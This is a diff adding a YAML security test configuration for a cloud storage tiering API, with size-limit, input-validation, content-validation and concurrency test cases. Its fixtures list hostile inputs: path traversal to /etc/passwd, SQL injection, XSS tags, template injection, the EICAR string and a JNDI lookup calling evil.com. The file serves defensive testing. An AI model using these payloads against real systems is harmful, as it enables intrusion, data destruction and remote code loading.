@@ -1,0 +1,110 @@
+# Security Test Configuration for Cloud Storage Tiering System
+# This config file drives all security tests
+
+test_suite:
+  name: "Cloud Storage Tiering System Security Tests"
+  version: "1.0.0"
+
+# Security test data
+test_data:
+  file_sizes:
+    below_minimum: 524288  # 512KB - below 1MB minimum
+    above_maximum: 11811160064  # 11GB - above 10GB maximum
+    valid: 2097152  # 2MB - valid size
+  
+  malicious_strings:
+    - "../../etc/passwd"
+    - "'; DROP TABLE files; --"
+    - "<script>alert('xss')</script>"
+    - "${jndi:ldap://evil.com/a}"
+    - "{{7*7}}"
+    - "'; SELECT * FROM users; --"
+    - "../"
+    - "..\\"
+    - "%2e%2e%2f"
+    - "null"
+    - "undefined"
+  
+  malicious_content:
+    - eicar: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+    - script_tags: "<script>malicious()</script>"
+    - sql_injection: "'; DROP TABLE files; --"
+    - xss: "<img src=x onerror=alert(1)>"
+
+# Security test cases
+test_cases:
+  input_validation:
+    - id: "SEC-001"
+      priority: "P0"
+      name: "Input Validation - File Size Limits"
+      endpoint: "POST /files"
+      description: "Test that file size limits are properly enforced"
+      steps:
+        - action: "attempt_upload_oversized"
+          size: "above_maximum"
+          expected_status: 400
+        - action: "verify_error_message"
+          message_contains: "maximum"
+        - action: "attempt_upload_undersized"
+          size: "below_minimum"
+          expected_status: 400
+        - action: "verify_error_message"
+          message_contains: "minimum"
+        - action: "verify_no_file_created"
+    
+    - id: "SEC-002"
+      priority: "P0"
+      name: "Input Validation - File ID Format"
+      endpoint: "GET/DELETE /files/{fileId}"
+      description: "Test that invalid file IDs are rejected safely"
+      steps:
+        - action: "upload_valid_file"
+          size: "valid"
+        - action: "test_sql_injection_ids"
+          operations: ["get", "delete", "metadata"]
+        - action: "test_path_traversal_ids"
+          operations: ["get", "delete", "metadata"]
+        - action: "test_special_char_ids"
+          operations: ["get", "delete", "metadata"]
+        - action: "verify_all_rejected"
+          expected_status: [404, 422]
+        - action: "verify_no_server_errors"
+        - action: "verify_no_stack_traces"
+
+  content_validation:
+    - id: "SEC-003"
+      priority: "P0"
+      name: "File Content Validation"
+      endpoint: "POST /files"
+      description: "Test that malicious content is handled safely"
+      steps:
+        - action: "upload_malicious_content"
+          content_type: "eicar"
+        - action: "upload_malicious_content"
+          content_type: "script_tags"
+        - action: "upload_malicious_content"
+          content_type: "sql_injection"
+        - action: "upload_malicious_content"
+          content_type: "xss"
+        - action: "verify_content_stored_safely"
+        - action: "verify_no_execution"
+        - action: "verify_metadata_sanitized"
+
+  concurrency_security:
+    - id: "SEC-004"
+      priority: "P0"
+      name: "Concurrent Access Security"
+      endpoint: "Mixed"
+      description: "Test system security under concurrent access"
+      steps:
+        - action: "upload_valid_file"
+          size: "valid"
+        - action: "prepare_concurrent_security_operations"
+          operations: ["download", "delete", "metadata"]
+        - action: "run_concurrent_security_operations"
+          record_errors: true
+        - action: "verify_no_corruption"
+        - action: "verify_consistent_state"
+        - action: "verify_correct_ordering"
+        - action: "verify_no_race_conditions"
+
